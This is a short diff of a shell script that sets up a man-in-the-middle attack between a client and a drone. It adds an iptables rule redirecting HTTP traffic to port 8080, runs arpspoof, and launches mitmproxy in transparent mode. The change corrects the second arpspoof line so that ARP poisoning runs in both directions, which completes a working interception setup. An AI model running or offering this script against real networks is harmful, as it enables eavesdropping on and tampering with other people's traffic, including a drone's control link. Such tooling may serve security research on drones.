@@ -11,7 +11,7 @@ main () {
     iptables -t nat -A PREROUTING -i $INTERFACE -p tcp --dport 80 -j REDIRECT --to-port 8080
 
     arpspoof -i $INTERFACE -t $CLIENT_IP $DRONE_IP &
-    arpspoof -i $INTERFACE -t $CLIENT_IP $DRONE_IP &
+    arpspoof -i $INTERFACE -t $DRONE_IP $CLIENT_IP &
     mitmproxy -T --host
 }
 
